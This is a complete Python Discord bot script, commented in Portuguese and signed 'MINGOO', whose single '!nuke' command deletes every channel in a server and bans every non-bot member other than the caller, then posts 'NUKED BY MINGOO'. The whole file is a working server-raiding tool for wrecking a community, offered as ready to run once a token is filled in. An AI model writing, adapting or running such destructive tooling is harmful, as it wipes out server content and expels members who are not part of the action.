import discord
from discord.ext import commands

# Substitua 'YOUR_BOT_TOKEN' pelo token do seu bot
token = ''

# Configure os intents para o bot
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

# Prefixo do comando
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """Comando que apaga todos os canais e bane todos os membros do servidor."""
    guild = ctx.guild

    # Apaga todos os canais
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Canal {channel.name} apagado.')
        except Exception as e:
            print(f'Erro ao apagar {channel.name}: {e}')

    # Bane todos os membros
    for member in guild.members:
        if member != ctx.author and not member.bot:
            try:
                await member.ban(reason="Banido pelo comando nuke.")
                print(f'Membro {member.name} banido.')
            except Exception as e:
                print(f'Erro ao banir {member.name}: {e}')

    # Cria um novo canal padrão
    new_channel = await guild.create_text_channel('geral')
    await new_channel.send('`NUKED BY MINGOO`')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("\u26a0 Você não tem permissão para usar este comando.")
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send("\u26a0 Comando não encontrado.")
    else:
        await ctx.send(f"\u26a0 Ocorreu um erro: {error}")
# ______     __  __        __    __     __     __   __     ______     ______     ______    
#/\  == \   /\ \_\ \      /\ "-./  \   /\ \   /\ "-.\ \   /\  ___\   /\  __ \   /\  __ \   
#\ \  __<   \ \____ \     \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \ \__ \  \ \ \/\ \  \ \ \/\ \  
# \ \_____\  \/\_____\     \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_____\  \ \_____\  \ \_____\ 
#  \/_____/   \/_____/      \/_/  \/_/   \/_/   \/_/ \/_/   \/_____/   \/_____/   \/_____/ 

# Inicia o bot
bot.run(token)